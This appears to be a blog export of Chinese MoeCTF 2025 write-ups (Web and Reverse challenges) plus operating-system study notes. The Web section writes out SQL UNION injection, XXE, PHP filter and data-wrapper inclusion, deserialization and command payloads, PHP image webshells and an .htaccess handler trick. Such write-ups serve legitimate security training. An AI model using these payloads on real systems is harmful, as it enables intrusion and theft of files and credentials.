[{"title":"MoeCTF 2025 Web","path":"//MoeCTF 2025-5/","content":"MoeCTF 2025 Web部分 00 JSFuckJSFuck 仅使用六个不同的字符来编写和执行代码。 01 阅读前端代码Ctrl + Shift + I 打开开发工具 02 抓包 03 修改POST 仙门试炼台中央矗立着玄天剑宗至宝”问剑石”，石身流转着七彩霞光。你作为新晋弟子需测试天赋，但暗中知晓问剑石运作的玄机——其天赋判定实则通过金曦玄轨传递信息。初始测试将显示天赋：B，光芒：无，你需要施展”篡天改命”之术，修改玄轨中的关键参数，使问剑石显现天赋：S，光芒：流云状青芒(flowing_azure_clouds)的异象，从而获得宗门重视！ 04 HTTP请求第一关 第二关 第三关 第四关 第五关 第六关 修改 Referer 为 该地址即可 第七关 bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ== 05 文件遍历 CTF中有一招在文件目录中穿梭的技法，是什么呢？ 06 SQL登录注入 07 Robots协议访问 /robots.txt，发现 flag.php 文件，访问： 需要输入两个不同的数，MD5 哈希值若比较相等 MD5(s1502113478a)=0e861580163291561247404381396064MD5(s1885207154a)=0e509367213418206700842008763514PHP会将这两个字符串解释为科学计数法表示的数字，0的次方为0，两者相等a=s1502113478ab=s1885207154a 08 UNION注入*** 此术为破解玄机阁禁制的无上秘法，需精通”SELECT、UNION、FROM”三大真言精髓。相传此术修至大成，可洞悉万物本源，破解一切禁制。然修习此术需极高悟性，千年来唯xt长老等寥寥数人掌握。 用户名：admin 密码： 1 union all select value, null from user.flag -- - 09 shell命令注入 应该是 nslookup 等命令，使用分号闭合，打印环境变量 10 XXE(XML外部实体注入) ?xml version=1.0?!DOCTYPE a[ !ENTITY file SYSTEM flag.txt]输出file;/输出 11 爆破 HDdss看到了 GET 参数名由m,n,o,p,q这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道参数名等于参数值才能进入。 import itertoolsl = [m,n,o,p,q]zd = [.join(s) for s in itertools.permutations(l, r=None)]with open(11.txt,w) as f: for p in zd: f.write(fp ) 然后可以跳转到一个探查网站，但是提示看不到 使用 php://filter 伪协议 php://filter/convert.base64-encode/resource=flag.php 12 蚁剑 使用蚁剑连接，密码为 cmd 直接打印环境变量 13 图片上传（php图片马） php的图片马：准备一个jpg图片和php文件。在cmd中执行命令：copy 1.jpg/b+2.php/a 3.php 可以看的文件末尾已经有了 一句话木马 蚁剑连接 在文件系统中找到 flag.txt 14 图片上传（.htaccess） Apache有一个特殊文件，是什么呢？ .htaccess（超文本访问）是Apache Web服务器使用的配置文件，它允许在目录级别覆盖服务器的全局配置设置。这个文件通常放置在网站的根目录或特定子目录中。 猜测可以上传 .htaccess 文件，将jpg文件解析为php AddType application/x-httpd-php .jpg 或 FilesMatch \\.jpg$ SetHandler application/x-httpd-php/FilesMatch 这样配置后，服务器会将所有.jpg文件当作PHP脚本执行，即使它们实际上包含的是PHP代码。 之后再上传一个 图片马（jpg 文件），蚁剑成功连接 15 ???图片上传（条件竞争） 图片上传至uploads 16 文件包含漏洞?phperror_reporting(0);highlight_file(__FILE__);include($_GET[file] . .php); 包含一个 file值 + php 后缀，自然想到data伪协议 这里会将 FLAG 环境变量放到一个 flag….txt 文件中，然后取消设置 FLAG 那需要传入查看这个文件内容的 php代码 data://text/plain,?php system(cat /flag*);? 17 php序列化与反序列化 ?phpclass A public $a = system(ls /);; echo serialize(new A() )?# O:1:A:1:s:1:a;s:15:system(ls /);; 继续查看就可获得 flag ?phpclass A public $a = system(cat /flag);; echo serialize(new A() )?","categories":["MoeCTF 2025"]},{"title":"操作系统","path":"//操作系统/","content":"操作系统原理 程序与进程调度 程序与进程的区别 进程是动态的，程序是静态的，程序是有序代码的集合 进程是暂时的，程序是永久的，进程是一个状态变化的过程，程序可长久保存 进程与程序的组成不同，进程包括程序（代码段）、数据段、进程控制块 进程是程序的执行 通过多次执行，一个程序可对应多个进程 通过调用关系，一个进程可包括多个程序 1.CPU调度分类 作业调度：高级 内存对换：中级 进程调度：低级 剥夺抢占（优先级高的进程剥夺其他低进程） 非剥夺非抢占 算法 FCFSFIFO：先来先服务 短作业优先 优先级 调度算法 最高响应比优先 调度算法 时间片轮转：分时 *多级反馈队列 调度算法 指标 $周转时间 等待时间 + 服务时间 作业完成时刻 - 作业到达时刻$ $ 响应比 (等待时间+服务时间)服务时间 $ 2. 进程同步制约关系：同步直接、互斥 临界资源：一次仅允许一个进程使用的资源 临界区：访问临界资源的代码 进程同步机制原则： 空闲让进 忙则等待 有限等待 让权等待 实现进程同步的机制：信号量机制、管程机制 信号量S的值 S 0 代表没有可用资源 S 1 代表仅有一个可用资源，即实现进程互斥 S n 代表有 n 个可用资源 S -n 代表有 n 个进程等待 P、V操作：低级进程通信原语，不可被打断 P 使用，V 放回 3.死锁死锁：多个进程竞争资源而造成的一种僵局，若无外力进程无法推进 银行家算法死锁的解决方法预防：破坏互斥条件、破坏不剥夺条件、破坏请求和保持条件、破坏循环等待条件 这四个条件必须同时成立，死锁才会发生。因此，预防死锁的策略就是设法破坏其中至少一个条件 避免：安全状态，银行家算法 检测：利用死锁定理 解除：资源剥夺法、撤销进程法、进程回退法","categories":["操作系统"]},{"title":"MoeCTF 2025 Reverse","path":"//MoeCTF 2025-1/","content":"逆向部分 题目speedDid you see my little pony? She runs really fast...附件：speed.zip 运行 speed.exe ，窗口一晃而过 直接使用 IDA Pro 打开，注意到主函数中有 Winmain 函数 跳转到 Winmain 函数 Winmain 是Windows 桌面程序的主函数 注意到29行 ShowWindow 命令，和32行 DestroyWindow 。 之间只有 sleep(1) 就是这个函数让窗口一晃而过。在这下断点，执行。窗口停下。 微软 Visual C++ 中 Sleep() 参数单位是 毫秒 大写S Linux 中 sleep() 参数单位是秒 小写s 标准 C 中 sleep() 参数单位也是秒 小写s Base打开程序，提示输入 flag，随便输入一个，程序退出 用 IDA 打开程序 32行，Buffer 认为是输入，v4 是输入长度， v11 是长为16的字符数组 33行，v7 与 一串神秘字符比较，猜测 v7 需要等于这串字符 注意到这串字符 结尾是 =，查看 32 行的函数，可以判断应该是个 base64 编码函数 import base64ciphertext = bW9lY3Rme1kwdV9DNG5fRzAwZF9BdF9CNDVlNjQhIX0=b = base64.b64decode(ciphertext) print(b.decode()) 解码，即得到 flag catch flag db geoi~lq~bcyUcyUkUlkaoUlfkmw,0 enc 是一个很简单的异或函数，一切都很简单，写一个简单的 c++ 程序模拟 #includeiostream#includestringstd::string flag = geoi~lq~bcyUcyUkUlkaoUlfkmw;char enc(char a) return a ^ 0x11;int main() int len = flag.size(); for(int i = 0; i len; i++) flag[i] = enc(flag[i]); std::cout flag std::endl; return 0; 运行结果是： vt~xo`osrhDrhDzDzp~Dwz|f 很显然不是 flag 结合提示 IDA pro 9.0 推出了针对 C++ exception 的优化但是这并不意味着所有的 try catch 都能被正确反编译 这意味着需要读汇编 注意到下面这段汇编代码，有一个比上面的 flag 更像 flag 的字符串 islower， isupper函数表示分大小写需要对字符进行不同处理（特殊字符不处理） 总而言之，重新写一个 c++ 程序 #includeiostream#includestringstd::string flag = zbrpgsF4z3_Ge1px_jvgu_@sybjre_qrfhjn;int main() int len = flag.size(); for(int i = 0; i len; i++) if(islower(flag[i])) flag[i] = (flag[i] - 84) % 26 + a; else if(isupper(flag[i])) flag[i] = (flag[i] - 52) % 26 + A; std::cout flag std::endl; return 0; 运行结果： moectfS4m3_Tr1ck_with_@flower_desuwa moe_upx直接将文件拖入 IDA 发现无法反汇编，使用 upx 脱壳 upx -d moe.exe 然后 moe.exe 就能正常反编译了 使用 fgets 读入一行，存储到 Buffer，然后对Buffer每个字符与 0x21 异或，再与后一个字符异或，得到 v14 重写： #includeiostream#includestringint main() std::string flag; std::cin flag; int len = flag.size(); if(len) for(int i = 0; i len; i++) flag[i] = flag[i] ^ 0x21; if(i len - 1 ) flag[i] = flag[i] ^ flag[i+1]; std::cout flag std::endl; return 0; 看比较部分： 只有当 v14 与 v10 这两个数组 前35 个字符一样时，才不会输出表示失败的字符串 现在看看 v10 是什么，就是一些字节数据 32个63位整数 SSE 指令（_mm_load_si128）加载 128 位数据（xmmword） 到内存。 以十六进制按顺序排列 ：232B2736333C0348640B1D767B100B3A3F65762915371C0A08213E3C3D160B24（小端序） 仔细一看，除了 v10 数组以外，在下面还有 v11 , v12 , v13 分别为 41 , 36 , 86（十进制） 此外提示消息还提到 fget会连同换行符一起读入。换行符 的 ASCII 码值为 0x10 ，与0x21 异或结果为 0x2B 最终应该在原十六进制数后加上 29 24 56 2B 最后是逆向获取 flag 的过程。 从后往前，对每个字符，先与后一个字符异或，再与 0x21 异或 特殊情况：最后一个字符直接与 0x21 异或（也是迭代的第一个字符） # 36 27 2B 23 # 48 03 3C 33 # 76 1D 0B 64 # 3A 0B 10 7B # 29 76 65 3F # 0A 1C 37 15# 3C 3E 21 08# 24 0B 16 3D# 小端序# d41 d36 d86 - 29 24 56# A^21 = 2B fget还会在末尾有 x = 232B2736333C0348640B1D767B100B3A3F65762915371C0A08213E3C3D160B242924562Bs = bytes.fromhex(x)s_list = list(s)length = len(s_list)print(s_list)for i in range(length): if i == 0: s_list[length - i - 1] = s_list[length - i - 1] ^ 0x21 else: s_list[length - i - 1] = s_list[length - i] ^ s_list[length - i - 1] s_list[length - i - 1] = s_list[length - i - 1] ^ 0x21print(s_list)ascii_str = bytes(s_list).decode(ascii) print(ascii_str) 输出结果： moectfY0u_c4n_unp4ck_It_vvith_upx ez3试运行： 现在拖入 IDA 查看 第19行：要求是 42 个字符 第27行：符合 moectf...... 的格式 else分支应该是对 v11 ：flag 进行某种变换 第40行：注意到 v5 使用在 使用 end 迭代器，且长度为 1 ，猜测与 有关 第41行：注意到 v6 使用在 使用 begin 迭代器，且长度为 7 ，猜测与 moectf 有关 那现在很自然可以认为最终 v12 应该是flag 中 内的内容 最终要想输出 OK，需要 v5 1，即 check(v12) 返回 1 查看 check() 函数 a 数组： 现在可以开始求解 flag 了 先重写一下 check 函数 def is_flag(flag): b = [0] * 34 for i in range(34): b[i] = 47806 * (ord(flag[i]) + i) if i != 0: b[i] = b[i] ^ b[i-1] ^ 0x114514 b[i] = b[i] % 51966 if b[i] != ciphertext[i]: return False return True 使用 Z3 求解 from z3 import *ciphertext = [ 0x0B1B0, 0x5678,0x7FF2,0x0A332,0x0A0E8,0x364C,0x2BD4,0x0C8FE,0x4A7C,0x18,0x2BE4,0x4144,0x3BA6,0x0BE8C,0x8F7E,0x35F8,0x61AA,0x2B4A,0x6828,0x0B39E,0x0B542,0x33EC,0x0C7D8,0x448C,0x9310,0x8808,0x0ADD4,0x3CC2,0x796,0x0C940,0x4E32,0x4E2E,0x924A,0x5B5C]# 创建 Z3 求解器solver = Solver()# 定义 flag 字符和中间变量 b，使用 BitVec 类型（32 位）flag = [BitVec(fflag_i, 32) for i in range(34)]b = [BitVec(fb_i, 32) for i in range(34)]# 添加约束：flag 字符在 ASCII 可打印字符范围内 (32 到 126)for i in range(34): solver.add(flag[i] = 32, flag[i] = 126)# 根据 is_flag 函数的逻辑添加约束for i in range(34): temp = 47806 * (flag[i] + i) if i == 0: solver.add(b[i] == temp % 51966) else: temp = temp ^ b[i-1] ^ 0x114514 solver.add(b[i] == temp % 51966) solver.add(b[i] == ciphertext[i])# 存储所有解solutions = []while solver.check() == sat: model = solver.model() # 提取 flag 字符 flag_vals = [model[flag[i]].as_long() for i in range(34)] flag_str = .join(chr(val) for val in flag_vals) solutions.append(flag_str) # 添加排除当前解的约束 solver.add(Or([flag[i] != flag_vals[i] for i in range(34)])) # 可选：限制最大解的数量，避免过多输出 if len(solutions) = 100: # 限制最多 100 个解 break# 输出所有解if solutions: for idx, sol in enumerate(solutions, 1): print(fidx: sol)else: print(无解) 输出： 注意到多个解满足检查，逐个提交，第二个 flag 正确 moectfY0u_Kn0w_z3_S0Iv3r_N0w_a1f2bdce4a9 ezandroid 注意到 44 行，输入 文本，转换成 String ，Base64 编码后需要与 上面这串字符相等 在 Java（以及安卓开发中常见的语言如 Kotlin）中，trim() 是一个字符串方法，用于移除字符串首尾的空白字符，包括空格（ ）、制表符（\\t）、换行符（ ）、回车符（\\r）等。 import base64s = bW9lY3Rme2FuZHJvaWRfUmV2ZXJzZV9JNV9lYXN5fQ==b = base64.b64decode(s) # Base64 解码print(b.decode()) base64 解码，即可 moectfandroid_Reverse_I5_easy flower 花指令 直接拖入 IDA solve 函数无法反编译 格式检查部分： 最下方：右侧是 格式错误分支，左侧是我们需要关心的地方 loc_4048E5: jz short Label jnz short Label call near ptr Label+1Label: lea rax, [rbp+var_59] _Z5solveNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE endp ; sp-analysis failed jz 和 jnz 表示为 0 和不为 0 时均跳转到 Label call 指令不会被执行到，并且在反编译时对反编译器造成干扰，使用 NOP 指令替换 现在能成功反编译 solve函数 现在能发现格式检查部分的逻辑 查看 0x4048F2 地址处的汇编代码 这里看到涉及到 begin (7)和 end (1)的迭代器，可以猜测这里对格式进行处理， 然后将长度与 20h ，即 32比较，可以猜测 flag的 中字符串长度为 32 输出变了，说明猜测正确 现在 想想如何输出 Win 将每个字符使用 encode 函数编码，然后与 enc 比较，不同会输出 Wrong，刚好 32 个十六进制数 enc:4F 1A 59 1F 5B 1D 5D 6F 7B 47 7E 44 6A 07 59 67 0E 52 08 63 5C 1A 52 1F 20 7B 21 77 70 25 74 2B key 23h key 是一个全局变量， 每次执行都会加 1 逆向这个 encode 函数很简单 s = for i in range(min(len(enc), length)): s += chr(enc[i] ^ (key + i)) # 逆向异或 但是仅仅这样的话会输出不可打印字符。 原因是 key 不一定仅仅在这里被使用 ，可能在别的地方被改过，已经不是最初的指了。 搜索 key 发现在 main 函数中也被使用，虽然我们没能反编译出。 查看发现 key 会与 0xA 异或，现在 key = 0x23 ^ 0x0A enc = [0x4F ,0x1A ,0x59 ,0x1F ,0x5B ,0x1D ,0x5D ,0x6F ,0x7B ,0x47 ,0x7E ,0x44 ,0x6A ,0x07, 0x59 ,0x67 ,0x0E ,0x52 ,0x08,0x63 ,0x5C ,0x1A ,0x52 ,0x1F ,0x20 ,0x7B ,0x21 ,0x77 ,0x70 ,0x25 ,0x74 ,0x2B]s = for i in range(min(len(enc), length)): s += chr(enc[i] ^ (key + i)) # 逆向flag = moectf + s + print(flag) 输出： moectff0r3v3r_JuMp_1n_7h3_a$m_a9b35c3c 本题中还使用 ptrace ，实现禁止跟踪进程，用于对抗动态调试 A cup of tea TEA 加密 花了半天才找到 主函数 sub_14001109B 函数： 可以看出这是一个 TEA 加密算法，使用 DELTA = 0x114514 逆向这个过程即可 from ctypes import c_uint32def decrypt_block(left, right, k): sum_val = 0x114514 * 32 # sum = DELTA * rounds for _ in range(32): right = c_uint32(right - ((k[3] + (left 5)) ^ (sum_val + left) ^ (k[2] + 16 * left))).value left = c_uint32(left - ((k[1] + (right 5)) ^ (sum_val + right) ^ (k[0] + 16 * right))).value sum_val -= 0x114514 return left, rightv9 = [ 2026214571, # 0x78B1DCAB 578894681, # 0x22849959 1193947460, # 0x472A8944 -229306230, # 0xF29BFC6A 73202484, # 0x045D0374 961145356, # 0x394A0E0C -881456792, # 0xCB4B6B68 358205817, # 0x1559FC79 -554069347, # 0xDEF4F19D 119347883, # 0x071C1F2B]v8 = [ 289739801, # 0x1142CB19 427884820, # 0x19829914 1363251608, # 0x51435998 269567252, # 0x10119914]# 解密 v9 的每个块（5 个块，每个块 8 字节）decrypted = []for i in range(0, 10, 2): left = c_uint32(v9[i]).value # 转换为无符号 32 位整数 right = c_uint32(v9[i + 1]).value dec_left, dec_right = decrypt_block(left, right, v8) decrypted.append(dec_left) decrypted.append(dec_right)# 将解密后的 DWORD 转换为字节flag_bytes = []for val in decrypted: flag_bytes.extend(val.to_bytes(4, byteorder=little))# 转换为 ASCII 字符串flag = bytes(flag_bytes).decode(ascii, errors=ignore)print(Decrypted Flag:, flag) 输出： moectfh3r3_4_cuP_0f_734_f0R_y0U!!!!!! ezpy.pyc pyc文件是 Python 字节码（Bytecode）的编译缓存文件。 使用反编译工具 uncompyle6 pip install uncompyle uncompyle filename # 直接使用 # 加密函数def caesar_cipher_encrypt(text, shift): result = [] for char in text: if char.isalpha(): if char.islower(): new_char = chr((ord(char) - ord(a) + shift) % 26 + ord(a)) else: if char.isupper(): new_char = chr((ord(char) - ord(A) + shift) % 26 + ord(A)) result.append(new_char) else: result.append(char) else: return .join(result) 注意到 小写字母映射到 另一个小写字母，大写字母映射到另一个大写字母，其他字符不变 那这个加密函数的解密就很简单了 plaintext = user_inputshift = 114514encrypted_text = caesar_cipher_encrypt(plaintext, shift)if encrypted_text == wyomdpI0e_Ux0G_zim: print(Correct!!!!) 现在试着写逆向函数： def decrypt(ciphertext,shift): text = [] for char in ciphertext: if char.isalpha(): if char.islower(): old_char = chr((ord(char) - ord(a) - shift) % 26 + ord(a)) else: if char.isupper(): old_char = chr((ord(char) - ord(A) - shift) % 26 + ord(A)) text.append(old_char) else: text.append(char) else: return .join(text) ciphertext = wyomdpI0e_Ux0G_zimshift = 114514plaintext = decrypt(ciphertext,shift)print(plaintext) 输出： moectfY0u_Kn0W_pyc have_fun试运行 拖入 IDA ，查看反编译代码。40~43行非常熟悉，这是在计算 String 的长度 v5，可以看到如果长度 大于 32 就会执行很长一块代码 大于32时会执行很长一串块代码，从前往后循环处理32字节的字符，剩余的字符，分别与 0x2A 异或加密 这就是加密逻辑，那接下来就应该是比较逻辑 注意到 83 行的 break ，这应该是比较中不愿意看到的，触发条件就是加密后的数组需要与 aGeoiLqbj 数组一致（仅需前 len(aGeoiLqbj)部分一致 ） 注意到 87 行 v17，上面提到这个变量会触发 break ，在这行 if条件中又出现，无论如何，不能让这个 if 语句执行，这个语句触发的第二个条件是加密后的数组长度不等于16，所以我们输入的 flag 长度应该为 16 查看 aGeoiLqbj ： 逆向解密： aGeoiLqbj = [0x47,0x45,0x4F,0x49,0x5E,0x4C,0x51,0x62,0x6A,0x5C,0x1E,0x75,0x4C,0x7F,0x44,0x57]length = len(aGeoiLqbj)# 逐字符 XOR 加密# for i in range(length):# encrypted_text[i] = String[i] ^ 0x2A; # 每个字符 XOR 0x2Aplaintext = []for i in range(length): plaintext.append(chr(aGeoiLqbj[i] ^ 0x2A))plaintext = .join(plaintext)print(plaintext) 输出： moectfH@v4_fUn mazegame直接执行： 拖入 IDA 76 行：应该是超出迷宫范围 81行：应该是撞墙逻辑（对应字符串处有 %d，%d，输出两个整数，就是之前截图里的撞墙提示坐标） 86行：到达终点 现在查看这个 byte_140005660 ，发现在 13 行调用过的函数里被初始化过。 bool dfs(int x, int y, std::vectorstd::string maze, std::string path) // 到达目标点 if (x == 32 y == 15) return true; // 标记当前位置为已访问 maze[y][x] = 1; // 四个方向：下、右、左、上 const int dx[] = 0, 1, -1, 0; const int dy[] = 1, 0, 0, -1; const char dir[] = S, D, A, W; // 尝试四个方向 for (int i = 0; i 4; i++) int nx = x + dx[i]; int ny = y + dy[i]; // 检查新位置是否有效且未访问 if (nx = 0 nx maze[0].length() ny = 0 ny maze.size() maze[ny][nx] == 0) path += dir[i]; if (dfs(nx, ny, maze, path)) return true; // 回溯：如果这条路走不通，删除这一步 path.pop_back(); return false;int main() std::vectorstd::string maze = v9; // 复制一份地图，避免修改原始数据 std::string path; if (dfs(1, 1, maze, path)) std::cout 找到路径: path std::endl; std::cout 路径长度: path.length() std::endl; else std::cout 没有找到路径！ std::endl; return 0; upx_revenge使用 upx -d 解压缩： 提示说查看 文件的 UPX 特征 左边是题目的二进制，右边是一个我自己使用 upx 压缩的 exe 文件 对比，发现少了 UPX!，把它补上，就能正常 脱壳 脱壳成功，现在就是逆向代码的过程了。 xor_base64 = .join(chr(ord(c) ^ 0xE) for c in ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/)target = lY7bW=\\\\ck?eyjX7]TZ\\\\CVbh\\\\tOyTH6jH7XmFifG]H7index_map = c: i for i, c in enumerate(xor_base64)flag = i = 0while i len(target): group = target[i:i+4] pad = group.count(=) # 处理填充 chars = [c for c in group if c != =] # 如果有填充，补齐索引 while len(chars) 4: chars.append(xor_base64[0]) try: idx = [index_map[c] for c in chars] value = (idx[0] 18) | (idx[1] 12) | (idx[2] 6) | idx[3] flag += chr((value 16) 0xFF) if pad 2: flag += chr((value 8) 0xFF) if pad 1: flag += chr(value 0xFF) except KeyError as e: print(fError: Character e not in encoding table) break i += 4# 去除末尾多余字符print(fFlag: flag.rstrip(chr(0))) moeaY0u_Re4l1y_G00d_4t_Upx!!!猜测：moectfY0u_Re4l1y_G00d_4t_Upx!!! guess反编译： 发现需要 guess 的是一个随机数，那很难猜了。最多只能猜十次，范围是0~99，运气好一点能直接猜到。 但是我直接修改这个 count 9 为 count 0x70，即可 moectfRrRRccCc44$$_w1th_fl0w3r!!_3c6a11b5 chall 暂时放弃 调试一下，发现： 381082: The instruction at 0x381082 referenced memory at 0x0. The memory could not be written - 00000000 (exc.code c0000005, tid 30616) 查看 0x381082 eax 之前被清零，现在往地址 0 处写 0 ，这是不允许的，难怪会崩溃。 查看这段代码的被引用位置： 现在很清晰了，检测到被调试，于是走到会引发错误的分支 现在反编译这段代码，发现更恐怖的事情，就是反调试手段不止这一个 现在就能直接动态调试： 63656F6D moec747B6674 tft5F736968 his_615F7369 is_a616C665F _fla00007D67 g 百思不得其解，但是后面发现了 TLScallback ，还是经验太少了，还以为是加载什么 dll 的函数 TLS（Thread Local Storage，线程局部存储）回调函数是 Windows 可执行文件（PE 文件）中用于处理线程或进程初始化终止的特殊函数。它定义在 PE 文件的 .tls 节中，通常在程序主入口点（如 main 或 WinMain）之前或进程线程退出时自动调用。TLS 回调函数常用于： 初始化：在进程或线程启动时执行特定操作（如加载动态库、替换函数地址）。 反调试：检测调试器或防止逆向分析。 资源管理：分配或释放线程局部存储。 最逆天的一集： TLS（线程局部存储）回调函数，在进程线程初始化（a2 1）或终止（a2 2）时执行。 a2 1（DLL_PROCESS_ATTACH）： 调用 sub_401570 替换 strncmp（用 sub_401510）和 strlen（用 sub_4014C0）。 sub_401510 成为程序中 strncmp 的实际实现。 a2 2（DLL_PROCESS_DETACH）： 检测调试器（IsDebuggerPresent 或 NtQueryInformationProcess）。 如果检测到调试器，写入 MEMORY[0] 0，触发崩溃（反调试机制）。 ez_DESfrom Crypto.Cipher import DESimport secretsimport stringflag = moectf???characters = string.ascii_letters + string.digits + string.punctuationkey = ezdes+.join(secrets.choice(characters) for _ in range(3))assert key[:5] == ezdeskey = key.encode(utf-8)l = 8def encrypt(text, key): cipher = DES.new(key, DES.MODE_ECB) padded_text = text + (l - len(text) % l) * chr(len(text)) data = cipher.encrypt(padded_text.encode(utf-8)) return datac = encrypt(flag, key)print(c =, c)# c = b\\xe6\\x8b0\\xc8m\\t?\\x1d\\xf6\\x99sA\\xce \\rN\\x83z\\xa0\\xdc\\xbc\\xb8X\\xb2\\xe2q\\xa4\\xfc\\x07 moectf_Ju5t envmEra+e.! two cup of tea 第 40 行读取输入，从这开始看： strcspn 返回 Buffer 中第一个 的位置，即长度，要求长度小于 144，然后将输入字符串末尾 改为 \\0 第 51 行：调用函数，第一个参数与输入有关，第二个参数很神秘，第三个参数 来自前面 37 行的函数，这个函数调用时间在接收输入之前，可以判断与我们的输入无关。所以在这下断点，看看它是什么 是 2 ? 但是查看 v10 ，就是 上面那串 moectf!! 这个反编译应该是有问题，还得读汇编代码 注意到在调用函数之前，将四个数 xmm0 xmm1 12345678h 9ABCDEFh 放到了栈上，前两个是输入的字符串参数，后两个是两个固定的数。 在函数内看看它们是什么 第三个参数 a3 ：指向一个栈中地址，以小端序就是 0x63656F6D, 0x21216674, 0x12345678, 0x9ABCDEF0（这里只给出前16个字节，之后会解释为什么） 接下来应该就是对 输入进行加密，注意到对 a3 以及 v26 都指第三个参数，即刚刚发现的指针 它在整个加密过程中迭代，但是迭代结果会 3，这就说明这个指针只会指向前 4 个 4 字节数 (uint) 很容易猜到，这是 TEA 加密的密钥，但后面的加密过程有点变态，将输入的字符串 分割成 10 组，从前往后加密，并且循环 11 次 uint32_t encipher(uint32_t* v, const uint32_t* key) uint32_t v0 = v[0], v1 = v[1], v2 = v[2], v3 = v[3], v4 = v[4]; uint32_t v5 = v[5], v6 = v[6], v7 = v[7], v8 = v[8], v9 = v[9]; uint32_t sum = 0, delta = 0x9E3779B9; for (unsigned int i = 0; i 11; ++i) // 11 轮 uint32_t k_idx = (sum 2) 3; uint32_t k0 = key[k_idx], k1 = key[k_idx ^ 1], k2 = key[k_idx ^ 2], k3 = key[k_idx ^ 3]; v0 += (((v1 2) ^ (v9 5)) + ((v1 3) ^ (v9 4))) ^ ((v9 ^ k0) + (v1 ^ sum)); v1 += (((v2 2) ^ (v0 5)) + ((v2 3) ^ (v0 4))) ^ ((v0 ^ k1) + (v2 ^ sum)); v2 += (((v3 2) ^ (v1 5)) + ((v3 3) ^ (v1 4))) ^ ((v1 ^ k2) + (v3 ^ sum)); v3 += (((v4 2) ^ (v2 5)) + ((v4 3) ^ (v2 4))) ^ ((v2 ^ k3) + (v4 ^ sum)); v4 += (((v5 2) ^ (v3 5)) + ((v5 3) ^ (v3 4))) ^ ((v3 ^ k0) + (v5 ^ sum)); v5 += (((v6 2) ^ (v4 5)) + ((v6 3) ^ (v4 4))) ^ ((v4 ^ k1) + (v6 ^ sum)); v6 += (((v7 2) ^ (v5 5)) + ((v7 3) ^ (v5 4))) ^ ((v5 ^ k2) + (v7 ^ sum)); v7 += (((v8 2) ^ (v6 5)) + ((v8 3) ^ (v6 4))) ^ ((v6 ^ k3) + (v8 ^ sum)); v8 += (((v9 2) ^ (v7 5)) + ((v9 3) ^ (v7 4))) ^ ((v7 ^ k0) + (v9 ^ sum)); v9 += (((v0 2) ^ (v8 5)) + ((v0 3) ^ (v8 4))) ^ ((v8 ^ k1) + (v0 ^ sum)); sum += delta; // 加密：sum 递增 v[0] = v0; v[1] = v1; v[2] = v2; v[3] = v3; v[4] = v4; v[5] = v5; v[6] = v6; v[7] = v7; v[8] = v8; v[9] = v9; return v7; // 返回 v[7] 仅仅使用 加减异或移位 的加密，是可以复原的。写出解密函数 void decipher(uint32_t* v, const uint32_t* key) // 解密函数 uint32_t v0 = v[0], v1 = v[1], v2 = v[2], v3 = v[3], v4 = v[4]; uint32_t v5 = v[5], v6 = v[6], v7 = v[7], v8 = v[8], v9 = v[9]; uint32_t sum = 0x9E3779B9 * 11, delta = 0x9E3779B9; for (unsigned int i = 0; i 11; ++i) uint32_t k_idx = (sum 2) 3; uint32_t k0 = key[k_idx], k1 = key[k_idx ^ 1], k2 = key[k_idx ^ 2], k3 = key[k_idx ^ 3]; // 逆序减法（从 v9 到 v0，反转依赖） v9 -= (((v0 2) ^ (v8 5)) + ((v0 3) ^ (v8 4))) ^ ((v8 ^ k1) + (v0 ^ sum)); v8 -= (((v9 2) ^ (v7 5)) + ((v9 3) ^ (v7 4))) ^ ((v7 ^ k0) + (v9 ^ sum)); v7 -= (((v8 2) ^ (v6 5)) + ((v8 3) ^ (v6 4))) ^ ((v6 ^ k3) + (v8 ^ sum)); v6 -= (((v7 2) ^ (v5 5)) + ((v7 3) ^ (v5 4))) ^ ((v5 ^ k2) + (v7 ^ sum)); v5 -= (((v6 2) ^ (v4 5)) + ((v6 3) ^ (v4 4))) ^ ((v4 ^ k1) + (v6 ^ sum)); v4 -= (((v5 2) ^ (v3 5)) + ((v5 3) ^ (v3 4))) ^ ((v3 ^ k0) + (v5 ^ sum)); v3 -= (((v4 2) ^ (v2 5)) + ((v4 3) ^ (v2 4))) ^ ((v2 ^ k3) + (v4 ^ sum)); v2 -= (((v3 2) ^ (v1 5)) + ((v3 3) ^ (v1 4))) ^ ((v1 ^ k2) + (v3 ^ sum)); v1 -= (((v2 2) ^ (v0 5)) + ((v2 3) ^ (v0 4))) ^ ((v0 ^ k1) + (v2 ^ sum)); v0 -= (((v1 2) ^ (v9 5)) + ((v1 3) ^ (v9 4))) ^ ((v9 ^ k0) + (v1 ^ sum)); sum -= delta; // 解密：sum 递减 v[0] = v0; v[1] = v1; v[2] = v2; v[3] = v3; v[4] = v4; v[5] = v5; v[6] = v6; v[7] = v7; v[8] = v8; v[9] = v9; 接着看主函数，v7 循环计算 Buffer 长度，需要是 40 然后将 密文与 之前硬编码的数组比较，需要全部相等，这就是密文 现在对密文进行解密，应该就是flag 参考主函数： #include iostream#include cstdint// 辅助函数：uint32 数组转字符串（小端序，包含所有字节）std::string uint32_to_string(const uint32_t* input, size_t len) std::string result; for (size_t i = 0; i len; ++i) uint32_t word = input[i]; result += static_castchar(word 0xFF); result += static_castchar((word 8) 0xFF); result += static_castchar((word 16) 0xFF); result += static_castchar((word 24) 0xFF); return result;int main() uint32_t ciphertext[10] = 0x5D624C34, 0x8629FEAD, 0x9D11379B, 0xFCD53211, 0x460F63CE, 0xC5816E68, 0xFE5300AD, 0x0A0015EE, 0x9806DBBB, 0xEF4A2648 ; const uint32_t k[4] = 0x63656F6D, 0x21216674, 0x12345678, 0x9ABCDEF0; decipher(ciphertext, k); std::string plaintext = uint32_to_string(ciphertext, 10); std::cout plaintext std::endl; return 0; 输出： moectfX7e4_And_xx7EA_I5_BeautifuL!!!!! ezandroidpro在源代码comMainActivity中注意到，输入长度需要为 32，然后调用 check 方法，最后返回 1 输出 成功 那只需要弄清楚 check 是如何检查字符串即可 check 函数是一个 native 方法，它位于动态链接库（.so 文件）中。 根据代码中的 System.loadLibrary(ezandroidpro);语句，这个库的名字是 libezandroidpro.so。 接下来逆向这个 lib 二进制 使用 IDA 打开，一片狼藉 使用 Ghidra 